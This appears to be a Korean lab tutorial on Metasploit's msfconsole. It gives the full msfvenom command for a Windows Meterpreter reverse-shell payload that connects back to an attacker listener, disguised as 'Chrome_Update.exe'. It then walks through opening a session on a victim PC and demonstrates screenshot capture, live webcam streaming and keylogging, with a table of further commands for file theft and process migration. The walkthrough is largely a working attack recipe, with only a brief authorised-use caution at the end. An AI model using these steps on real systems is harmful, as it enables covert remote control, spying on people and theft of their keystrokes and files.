# msfconsole

- Metasploit Framework는 취약점 검증, 익스플로잇 테스트, 침투 테스트를 위한 보안 프레임워크입니다.
- msfconsole은 Metasploit의 메인 콘솔 인터페이스로, 모듈 검색·설정·실행 및 세션 관리를 수행합니다.

---

## msfconsole 진입

- 다음 명령어로 msfconsole에 진입합니다.
```text
msfconsole
```
![01](/msfconsole/imgs/01.png)

- 정상적으로 진입되면 프롬프트가 `msf >` 로 변경됩니다.

---

## 악성 페이로드 생성 (실습 환경)

- 새 터미널 창에서 피해자가 실행할 테스트용 프로그램을 생성합니다.
- 사용한 명령어는 다음과 같습니다.

```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.121 LPORT=4444 -f exe -o Chrome_Update.exe
```
| 구성 요소 | 이름 | 설명 | 특징 |
| --- | --- | --- | --- |
| msfvenom | Payload Generator | Metasploit 페이로드 생성 도구 | 단독 실행 가능 |
| -p | Payload | 사용할 페이로드 지정 | 공격 방식 결정 |
| windows/x64/meterpreter/reverse_tcp | Meterpreter Reverse TCP | 64비트 Windows용 원격 제어 페이로드 | 실행 시 공격자에게 역접속 |
| LHOST=192.168.0.121 | Local Host | 공격자(리스너) IP 주소 | 피해자가 연결할 대상 |
| LPORT=4444 | Local Port | 공격자 측 포트 번호 | 세션 수신 포트 |
| -f | Format | 출력 파일 형식 지정 | exe, elf, raw 등 |
| exe | Executable | Windows 실행 파일 형식 | 더블클릭 실행 |
| -o | Output | 출력 파일 이름 지정 | 파일 생성 |
| Chrome_Update.exe | Output File | 생성될 실행 파일 이름 | 정상 파일로 위장 가능 |

![02](/msfconsole/imgs/02.png)

- Home 디렉토리에 Chrome_Update.exe 파일이 생성된 것을 확인할 수 있습니다.

![03](/msfconsole/imgs/03.png)

---

## 실행 및 세션 확인

- 생성한 파일을 실습용 피해 PC에서 실행합니다.
- 실행 시 화면상 변화는 없으며 백그라운드에서 동작합니다.

![04](/msfconsole/imgs/04.png)

- msfconsole로 돌아가 다음 명령어로 세션 목록을 확인합니다.

```text
sessions -i
```
![05](/msfconsole/imgs/05.png)

- 연결된 세션을 선택하여 상호작용합니다.

```text
sessions -i 1
```
![06](/msfconsole/imgs/06.png)

- `meterpreter >` 프롬프트로 변경되며 세션 연결이 완료됩니다.

---

## msfconsole 세션 기능 

| 명령어 | 이름 | 설명 | 특징 |
| --- | --- | --- | --- |
| sessions -i | Session List | 현재 생성된 세션 목록 확인 | 여러 피해자 구분 |
| sessions -i [번호] | Session Interact | 특정 세션과 상호작용 | meterpreter 진입 |
| sysinfo | System Info | 피해 시스템 OS, 아키텍처, 컴퓨터명 확인 | 초기 정찰 필수 |
| getuid | User ID | 현재 권한으로 실행 중인 사용자 확인 | 권한 확인 |
| pwd | Print Working Dir | 현재 작업 디렉터리 출력 | 파일 작업 기준 |
| ls | List | 현재 디렉터리 파일 목록 확인 | 파일 탐색 |
| cd | Change Dir | 디렉터리 이동 | 경로 탐색 |
| download | Download | 피해 시스템의 파일 다운로드 | 정보 탈취 |
| upload | Upload | 공격자 파일 업로드 | 추가 페이로드 |
| screenshot | Screenshot | 피해 시스템 화면 캡처 | 사용자 행위 파악 |
| webcam_list | Webcam List | 사용 가능한 웹캠 목록 출력 | 장치 정보 |
| webcam_stream | Webcam Stream | 웹캠 영상 실시간 스트리밍 | 고위험 기능 |
| keyscan_start | Keylogger Start | 키보드 입력 수집 시작 | 백그라운드 동작 |
| keyscan_dump | Keylogger Dump | 수집된 키 입력 출력 | 정보 탈취 |
| keyscan_stop | Keylogger Stop | 키 입력 수집 중단 | 로그 종료 |
| ps | Process List | 실행 중인 프로세스 목록 확인 | 프로세스 탐색 |
| migrate | Process Migrate | 다른 프로세스로 세션 이동 | 안정성/은닉 |
| shell | System Shell | 시스템 쉘 획득 | 명령 직접 실행 |
| background | Background | 세션을 백그라운드로 전환 | 다중 세션 관리 |
| exit | Exit | 세션 종료 | 연결 종료 |

- 필자는 총 3개의 항목만 실습합니다.
---

## 화면 캡처

- 원격 시스템의 현재 화면을 캡처합니다.

```text
screenshot
```
![07](/msfconsole/imgs/07.png)

![08](/msfconsole/imgs/08.png)

- 캡처된 이미지 파일이 로컬 디렉토리에 저장됩니다.
- 화질은 좋지 않지만 무엇을 하고 있는지 정도는 식별될 정도입니다.

![09](/msfconsole/imgs/09.png)

---

## 웹캠 스트리밍

- 원격 시스템의 웹캠 영상을 실시간으로 확인합니다.

```text
webcam_stream
```
![10](/msfconsole/imgs/10.png)

---

## 키 입력 모니터링

- 피해자가 입력하는 키보드 정보를 수집합니다.

```text
keyscan_start
```
![11](/msfconsole/imgs/11.png)

- 필자는 다음과 같이 구글에 hi my name is sungjin을 검색했고, 화면을 캡쳐했습니다.

![12](/msfconsole/imgs/12.png)

- 다음 명령어로 지금까지 스니핑 한 키보드 정보를 화면에 출력합니다.
```text
keyscan_dump
```
![13](/msfconsole/imgs/13.png)
- `keyscan_stop`으로 키입력 수집을 중단할 수 있습니다.

---

## msfconsole 동작 원리

- Metasploit은 모듈 기반 구조로 동작합니다.
- 페이로드 실행 후 세션이 생성되며, 세션을 통해 원격 시스템과 상호작용합니다.

### 동작 흐름 요약

1. msfconsole 실행  
2. 페이로드 생성  
3. 피해 시스템에서 실행  
4. 세션 생성  
5. meterpreter로 원격 제어  

---

## 주의사항

- Metasploit은 실제 공격 도구이므로 반드시 허가된 실습 환경에서만 사용해야합니다.
- 안티바이러스 및 보안 솔루션에 의해 즉시 탐지될 수 있습니다.
- 허가 없는 시스템에 대한 사용은 불법입니다.
